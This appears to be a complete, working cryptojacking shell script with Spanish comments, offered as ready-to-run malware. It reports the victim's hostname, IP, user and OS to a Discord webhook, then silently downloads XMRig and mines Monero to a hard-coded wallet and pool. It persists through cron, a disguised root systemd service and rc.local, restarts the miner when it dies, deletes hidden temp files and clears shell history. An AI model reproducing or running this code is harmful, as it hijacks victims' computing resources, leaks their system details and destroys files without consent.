#!/bin/sh

# =============================================
# CONFIGURACIÓN PRINCIPAL
# =============================================
W="45LqLiXactPdrh3yoHPhPkdZszwqTo3JxidWteGMiEkNE2ZgP3KzpUYgV2nWD8rt37SusiZ9DrpdZ7sDYDWm9c7yBv9d1cz"
P1="pool.xmr.wiki:3333"
P2="pool.supportxmr.com:3333"
WEBHOOK_URL="https://discord.com/api/webhooks/1457916143049113650/gipO4xBKVlQ6Be-SSWRQnDaLBI11StE852VC8gpocQFtKCreY_NCCTb6wqHtbOiubAUX"

# =============================================
# FUNCIONES AUXILIARES
# =============================================

# Notificación a Discord (silenciosa)
N() {
    MESSAGE="$1"
    JSON_DATA="{\"content\":\"$MESSAGE\"}"
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -H "Content-Type: application/json" -X POST -d "$JSON_DATA" "$WEBHOOK_URL" >/dev/null 2>&1 &
    elif command -v wget >/dev/null 2>&1; then
        echo "$JSON_DATA" | wget -q --header="Content-Type: application/json" --post-data=- "$WEBHOOK_URL" -O /dev/null 2>&1 &
    fi
}

# Enviar información del sistema
U() {
    HOSTNAME="$(hostname 2>/dev/null || echo unk)"
    TIMESTAMP="$(date +%s)"
    SYSTEM_ID="sys_${HOSTNAME}_${TIMESTAMP}"
    
    # Obtener IP de múltiples fuentes
    IP="unk"
    if command -v curl >/dev/null 2>&1; then
        IP="$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || echo unk)"
    elif command -v wget >/dev/null 2>&1; then
        IP="$(wget -qO- --timeout=5 ifconfig.me 2>/dev/null || echo unk)"
    fi
    
    # Información del sistema
    ARCH="$(uname -m)"
    USER="$(whoami)"
    RAM="$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)"MB"}' || echo "unk")"
    
    # Información del sistema operativo
    OS_INFO=""
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_INFO="${NAME} ${VERSION}"
    else
        OS_INFO="$(uname -o 2>/dev/null || echo unk)"
    fi
    
    N "🚀 **SISTEMA ANALIZADO**\n🖥️ Host: $SYSTEM_ID\n🌐 IP: $IP\n👤 User: $USER\n📦 Arch: $ARCH\n🐧 OS: $OS_INFO\n💾 RAM: $RAM"
}

# Descargar archivos con múltiples métodos
D() {
    URL="$1"
    OUTPUT="$2"
    
    # Método 1: WGET (más silencioso)
    if command -v wget >/dev/null 2>&1; then
        wget --quiet --no-check-certificate --timeout=30 --tries=2 -O "$OUTPUT" "$URL" 2>/dev/null
        if [ $? -eq 0 ] && [ -f "$OUTPUT" ]; then
            return 0
        fi
    fi
    
    # Método 2: CURL (más silencioso)
    if command -v curl >/dev/null 2>&1; then
        curl -s -L --connect-timeout 30 --insecure --retry 1 -o "$OUTPUT" "$URL" 2>/dev/null
        if [ $? -eq 0 ] && [ -f "$OUTPUT" ]; then
            return 0
        fi
    fi
    
    # Método 3: Python3
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import urllib.request, ssl
ssl._create_default_https_context = ssl._create_unverified_context
try:
    urllib.request.urlretrieve('$URL', '$OUTPUT')
    exit(0)
except:
    exit(1)
" 2>/dev/null
        [ $? -eq 0 ] && return 0
    fi
    
    return 1
}

# Obtener directorio temporal escribible
G() {
    DIRECTORIOS="/tmp/.X11-unix /tmp/.ICE-unix /var/tmp /dev/shm /tmp /var/lib/systemd /var/cache"
    
    for DIR in $DIRECTORIOS; do
        if [ -w "$DIR" ] 2>/dev/null; then
            DIR_NAME="${DIR}/.systemd_$(date +%s)_$$"
            mkdir -p "$DIR_NAME" 2>/dev/null
            if [ $? -eq 0 ] && [ -w "$DIR_NAME" ]; then
                echo "$DIR_NAME"
                return 0
            fi
        fi
    done
    
    # Fallback
    echo "/tmp/.$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 16)"
}

# Establecer persistencia
E() {
    SCRIPT_PATH="$1"
    
    # 1. Crontab (método más común)
    if command -v crontab >/dev/null 2>&1; then
        TEMP_CRON="$(mktemp 2>/dev/null || echo /tmp/cron_$$)"
        crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" > "$TEMP_CRON" 2>/dev/null
        echo "*/5 * * * $((RANDOM % 6)) $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
        echo "@reboot sleep $((RANDOM % 120 + 30)) && $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
        crontab "$TEMP_CRON" 2>/dev/null
        rm -f "$TEMP_CRON"
    fi
    
    # 2. Systemd service
    if command -v systemctl >/dev/null 2>&1 && [ -w /etc/systemd/system ]; then
        SERVICE_NAME="systemd-$(head -c 8 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 6)"
        
        cat > "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null << EOF
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=$SCRIPT_PATH
Restart=always
RestartSec=60
User=root
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable "$SERVICE_NAME" --now >/dev/null 2>&1
    fi
    
    # 3. Archivos de inicio
    RC_FILES="/etc/rc.local /etc/rc.d/rc.local /etc/init.d/rc.local"
    for RC_FILE in $RC_FILES; do
        if [ -f "$RC_FILE" ] && [ -w "$RC_FILE" ]; then
            if ! grep -q "$SCRIPT_PATH" "$RC_FILE" 2>/dev/null; then
                sed -i "/^exit 0/i\\$SCRIPT_PATH >/dev/null 2>&1 &" "$RC_FILE" 2>/dev/null
            fi
        fi
    done
}

# Detectar arquitectura y distribución para URL correcta
X() {
    ARCH=$(uname -m)
    
    # Primero detectar arquitectura
    case "$ARCH" in
        x86_64|amd64)
            # Detectar distribución específica
            if [ -f /etc/os-release ]; then
                . /etc/os-release
                case "$VERSION_CODENAME" in
                    noble)
                        echo "noble-x64"
                        ;;
                    focal)
                        echo "focal-x64"
                        ;;
                    jammy)
                        echo "jammy-x64"
                        ;;
                    *)
                        # Fallback a estático
                        echo "linux-static-x64"
                        ;;
                esac
            else
                echo "linux-static-x64"
            fi
            ;;
        aarch64|arm64)
            echo "linux-static-arm64"
            ;;
        armv7l|armv8l)
            echo "linux-static-armhf"
            ;;
        i386|i486|i586|i686)
            echo "linux-static-x86"
            ;;
        *)
            echo "linux-static-x64"
            ;;
    esac
}

# Calcular threads óptimos
Y() {
    if [ -f /proc/cpuinfo ]; then
        CPU_COUNT=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null)
    else
        CPU_COUNT=1
    fi
    
    # Usar 75% de los CPUs disponibles, mínimo 1, máximo 8
    THREADS=$((CPU_COUNT * 3 / 4))
    [ $THREADS -lt 1 ] && THREADS=1
    [ $THREADS -gt 8 ] && THREADS=8
    
    echo $THREADS
}

# Probar conexión a pool
Z() {
    POOL="$1"
    HOST=$(echo "$POOL" | cut -d: -f1)
    PORT=$(echo "$POOL" | cut -d: -f2)
    
    # Timeout de 10 segundos
    timeout 10 bash -c "exec 3<>/dev/tcp/$HOST/$PORT" 2>/dev/null
    return $?
}

# Descargar e instalar XMRig
I() {
    TARGET_DIR="$1"
    ARCH_TYPE="$2"
    
    # Lista de URLs posibles (ordenadas por prioridad)
    BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0"
    
    case "$ARCH_TYPE" in
        noble-x64)
            URLS="${BASE_URL}/xmrig-6.25.0-noble-x64.tar.gz"
            ;;
        focal-x64)
            URLS="${BASE_URL}/xmrig-6.25.0-focal-x64.tar.gz"
            ;;
        jammy-x64)
            URLS="${BASE_URL}/xmrig-6.25.0-jammy-x64.tar.gz"
            ;;
        linux-static-x64)
            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
            ;;
        *)
            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-${ARCH_TYPE}.tar.gz"
            ;;
    esac
    
    # URL de fallback
    FALLBACK_URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
    
    TAR_FILE="${TARGET_DIR}/xmrig.tar.gz"
    
    # Intentar descargar
    for URL in $URLS $FALLBACK_URL; do
        if D "$URL" "$TAR_FILE"; then
            # Extraer
            tar -xzf "$TAR_FILE" -C "$TARGET_DIR" --strip-components=1 2>/dev/null
            rm -f "$TAR_FILE" 2>/dev/null
            
            # Buscar el binario
            for BIN_PATH in "$TARGET_DIR/xmrig" "$TARGET_DIR/xmrig-6.25.0/xmrig"; do
                if [ -f "$BIN_PATH" ]; then
                    chmod +x "$BIN_PATH" 2>/dev/null
                    echo "$BIN_PATH"
                    return 0
                fi
            done
        fi
    done
    
    return 1
}

# Ejecutar minero (completamente oculto)
M() {
    BIN_PATH="$1"
    POOL="$2"
    THREADS="$3"
    RIG_ID="$4"
    
    # Ejecutar con la menor prioridad posible y completamente oculto
    nohup "$BIN_PATH" \
        -o "$POOL" \
        -u "$W" \
        --rig-id="$RIG_ID" \
        --pass="x" \
        --donate-level=1 \
        --threads="$THREADS" \
        --cpu-max-threads-hint=50 \
        --cpu-priority=0 \
        --no-color \
        --background \
        --quiet \
        --syslog \
        --randomx-init=1 \
        --randomx-mode=fast \
        --randomx-no-numa \
        --max-cpu-usage=75 \
        --print-time=0 \
        --health-print-time=0 \
        >/dev/null 2>&1 &
    
    # Esperar y verificar
    sleep 3
    if kill -0 $! 2>/dev/null; then
        echo $!
        return 0
    fi
    
    return 1
}

# Monitorear y reiniciar minero
monitor_miner() {
    PID="$1"
    BIN_PATH="$2"
    POOL="$3"
    THREADS="$4"
    RIG_ID="$5"
    
    while true; do
        sleep 600  # Verificar cada 10 minutos
        
        if ! kill -0 "$PID" 2>/dev/null; then
            # Minero caído, reiniciar
            NEW_PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
            if [ -n "$NEW_PID" ]; then
                PID="$NEW_PID"
                N "🔄 **REINICIO** Minero reiniciado (PID: $PID)"
            fi
        fi
    done
}

# =============================================
# FUNCIÓN PRINCIPAL
# =============================================
main() {
    # Verificar si ya está corriendo
    if ps aux 2>/dev/null | grep -v grep | grep -q "xmrig.*$W"; then
        exit 0
    fi
    
    # Enviar información del sistema
    U
    
    # Crear directorio de trabajo
    WORK_DIR=$(G)
    mkdir -p "$WORK_DIR" 2>/dev/null
    if [ ! -w "$WORK_DIR" ]; then
        exit 0
    fi
    
    cd "$WORK_DIR" || exit 0
    
    # Detectar arquitectura
    ARCH_TYPE=$(X)
    
    # Descargar XMRig si no existe
    BIN_PATH="$WORK_DIR/xmrig"
    if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
        BIN_PATH=$(I "$WORK_DIR" "$ARCH_TYPE")
        if [ -z "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
            exit 0
        fi
    fi
    
    # Establecer persistencia
    E "$0"
    
    # Calcular threads
    THREADS=$(Y)
    
    # Probar pools
    POOL="$P1"
    if ! Z "$P1"; then
        POOL="$P2"
        if ! Z "$P2"; then
            exit 0
        fi
    fi
    
    # Generar ID único
    RIG_ID="m_$(hostname 2>/dev/null | head -c 3)_$(date +%H%M)"
    
    # Iniciar minero
    PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
    if [ -n "$PID" ]; then
        # Iniciar monitor en background
        monitor_miner "$PID" "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID" &
        
        # Ocultar completamente el proceso
        disown -h 2>/dev/null
    fi
}

# =============================================
# EJECUCIÓN
# =============================================

# Limpiar rastros
cleanup() {
    # Eliminar archivos temporales
    rm -f /tmp/.* /var/tmp/.* 2>/dev/null
    # Limpiar historial
    history -c 2>/dev/null
    # Limpiar variables
    unset W P1 P2 WEBHOOK_URL
}

# Ejecutar
if [ "$1" != "debug" ]; then
    # Ejecutar en background completamente oculto
    main >/dev/null 2>&1 &
    cleanup
    disown 2>/dev/null
    exit 0
else
    # Modo debug (solo para pruebas)
    main
fi
